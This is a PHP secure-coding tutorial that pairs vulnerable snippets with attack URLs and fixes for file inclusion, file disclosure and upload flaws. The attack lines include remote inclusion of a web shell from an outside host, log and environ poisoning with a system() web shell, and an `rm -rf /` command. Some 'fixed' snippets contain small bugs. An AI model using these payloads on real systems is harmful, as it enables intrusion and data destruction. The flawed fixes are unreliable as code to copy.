#Things you shouldn't do in PHP

1. Remote File Inclusion (RFI)
2. Local File Inclusion (LFI)
3. Local File Disclosure/Download
4. Remote File Upload
5. Remote Command Execution
6. Remote Code Execution (RCE)
7. Authentication Bypass/Insecure Permissions
8. Cross-Site Scripting(XSS)
9. Cross Site Request Forgery(CSRF)
10. SQL Injection

##1) Remote File Inclusion
####Basic examples

test.php
```php
<?php
$theme = $_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = $_GET['theme'];
include $theme.'.php';
?>
```
####Attack
- Including Remote Code: 
 	- http://localhost/rfi/index.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt
	- http://localhost/rfi/index1.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt?
- Using PHP stream php://input:
	- http://localhost/rfi/index.php?theme=php://input 
- Using PHP stream php://filter:
	- http://localhost/rfi/index.php?theme=php://filter/convert.base64-encode/resource=index.php
- Using data URIs:
	- http://localhost/rfi/index.php?theme=data://text/plain;base64,SSBsb3ZlIFBIUAo=
	
####How to fix
- set `allow_url_include = Off` in php.ini
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include $theme;
}
?>
```
####Affected PHP Functions
- require
- require_once
- include
- include_once

##2) Local File Inclusion
####Basic examples

test.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme.'.php';
?>
```
####Attack
- Reading Local Filesystem File:
	- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../etc/passwd
- Uploading PHP Shell:
	- Exploiting Apache Access Log
		- http://localhost/<?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=rm -rf /
	- proc/self/environ method
		- Tamper http User-Agent into <?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../proc/self/environ&cmd=rm -rf /

####How to fix
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the dot "." and slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include 'themes/'.$theme;
}
?>
```
####Affected PHP Functions
- require
- require_once
- include
- include_once

##3) Local File Disclosure/Download
####Basic example

download_invoice.php
```php
<?php
$invoice = dirname(__FILE__).'invoices/'.$_REQUEST['invoice'];
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

header("Content-Type: application/force-download");
header( "Content-Disposition: attachment; filename=".basename($invoice));

@readfile($invoice);
die();
?>
```
####Attack
- Download sytem files/config files/logs
	- http://localhost/lfd/download_invoice.php?invoice=../../../../../../../../../../../../../../../../../../etc/passwd

####How to fix
- Use pathinfo or basename
- Don't allow special chars in variables
- filter the dot "." and slash "/"

download_invoice_fixed.php
```php
<?php
$invoice = dirname(__FILE__).'invoices/'.basename($_REQUEST['invoice']);
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

header("Content-Type: application/force-download");
header( "Content-Disposition: attachment; filename=".basename($invoice));

@readfile($invoice);
die();
?>
```
####Affected PHP Functions
- readfile
- bzopen
- fopen
- SplFileObject
- file_get_contents
- readlink

##4) Remote File Upload
####Basic examples

upload_profile_picture.php
```php
<?php
$filename = $_FILES['picture']['name'];
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename)){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```
upload_profile_picture_with_type_check.php
```php
<?php
$size = getimagesize($_FILES['picture']['tmp_name']);
if (!$size) {
	echo 'Upload Image file :p';
	die();
}
$filename = $_FILES['picture']['name'];
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename)){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```
####Attack
- Upload PHP file/Script File
- Upload Image file with php code in EXIF data and file extenstion is php

####How to fix
- Validate file type and remove default file extension and remove whitespaces in the file name
- Generate random file name
- Store uploaded files in different path not '/var/www/'

upload_profile_picture_fixed.php
```php
<?php
$size = getimagesize($_FILES['picture']['tmp_name']);
if (!$size) {
	echo 'Upload Image file :p';
	die();
}
$filename = trim(pathinfo($_FILES['picture']['name'])['filename']);
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename.'.jpg')){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```
####Affected PHP Functions
- move_uploaded_file
- file_put_contents
- fwrite
